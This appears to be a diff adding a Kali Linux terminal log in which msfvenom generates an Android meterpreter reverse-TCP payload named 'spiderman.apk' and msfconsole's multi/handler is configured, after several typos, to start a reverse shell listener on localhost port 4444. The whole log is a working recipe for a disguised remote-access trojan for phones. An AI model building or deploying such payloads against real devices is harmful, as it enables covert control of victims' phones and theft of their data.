@@ -1,0 +1,74 @@
+┌──(kali㉿kali)-[~]
+└─$ sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=
+
+[sudo] password for kali: 
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+Error: One or more options failed to validate: LHOST.
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > spiderman.apk                                                                                                                                        2 ⨯
+
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder specified, outputting raw payload
+Payload size: 10188 bytes
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole                                                                              
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.0.30-dev                          ]
++ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Open an interactive Ruby terminal with 
+irb
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse tcp_
+[-] The value specified for PAYLOAD is not valid.
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+PAYLOAD => android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp-vvv
+[-] The value specified for PAYLOAD is not valid.
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+PAYLOAD => android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+PAYLOAD => android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+PAYLOAD => android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST ser PAYLOAD android/meterpreter/reverse_tcp
+LHOST => ser PAYLOAD android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST ser PAYLOAD android/meterpreter/reverse_tcp
+LHOST => ser PAYLOAD android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+msf6 exploit(multi/handler) > exploit
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444 
+
